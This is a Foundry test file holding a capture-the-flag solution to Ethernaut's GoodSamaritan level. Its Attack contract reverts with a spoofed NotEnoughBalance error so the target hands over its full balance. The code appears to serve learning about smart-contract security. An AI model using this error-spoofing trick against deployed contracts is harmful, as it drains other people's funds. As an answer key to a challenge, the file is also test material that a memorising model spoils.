// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/27-GoodSamaritan/GoodSamaritanFactory.sol";
import "../src/Ethernaut.sol";

contract GoodSamaritanTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testGoodSamaritanHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GoodSamaritanFactory factory = new GoodSamaritanFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        // GoodSamaritan level = GoodSamaritan(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        Attack hack = new Attack();
        hack.attack(levelAddress);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    error NotEnoughBalance();

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(address target) public {
        GoodSamaritan(target).requestDonation();
    }
}